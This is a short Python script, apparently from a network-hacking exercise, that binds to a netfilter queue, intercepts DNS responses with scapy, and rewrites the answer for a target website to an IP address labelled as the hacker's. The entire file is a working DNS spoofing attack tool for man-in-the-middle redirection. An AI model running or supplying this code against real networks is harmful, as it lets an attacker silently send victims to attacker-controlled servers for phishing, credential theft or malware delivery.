import netfilterqueue
import scapy.all as scapy
import argparse


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-w", "--website", dest="website",
                        help="Website url")
    parser.add_argument("-i", "--ip-address", dest="ip",
                        help="Hacker IP address")
    options = parser.parse_args()
    return options


def spoof_packet(packet):
    options = get_arguments()
    dns_packet = scapy.IP(packet.get_payload())
    if dns_packet.haslayer(scapy.DNSRR):
        print(dns_packet.show())
        qname = dns_packet[scapy.DNSQR].qname
        if options.website in qname:
            dns_responce = scapy.DNSRR(rrname=qname, rdata=options.ip)
            dns_packet[scapy.DNS].an = dns_responce
            dns_packet[scapy.DNS].ancount = 1

            del dns_packet[scapy.IP].len
            del dns_packet[scapy.IP].chksum
            del dns_packet[scapy.UDP].len
            del dns_packet[scapy.UDP].chksum

            packet.set_payload(str(dns_packet))
    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, spoof_packet)
queue.run()
